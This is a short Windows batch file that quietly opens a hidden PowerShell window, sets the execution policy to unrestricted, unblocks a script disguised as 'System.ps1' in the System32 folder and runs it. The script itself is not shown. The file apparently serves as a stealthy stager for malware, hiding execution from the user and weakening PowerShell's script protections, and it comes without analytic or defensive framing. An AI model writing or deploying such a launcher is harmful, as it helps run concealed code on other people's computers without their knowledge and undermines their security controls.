@ECHO OFF
cmd.exe /q /c "powershell.exe -windowstyle hidden set-executionpolicy unrestricted ; Unblock-File C:\Windows\System32\System.ps1 ; C:\Windows\System32\System.ps1"
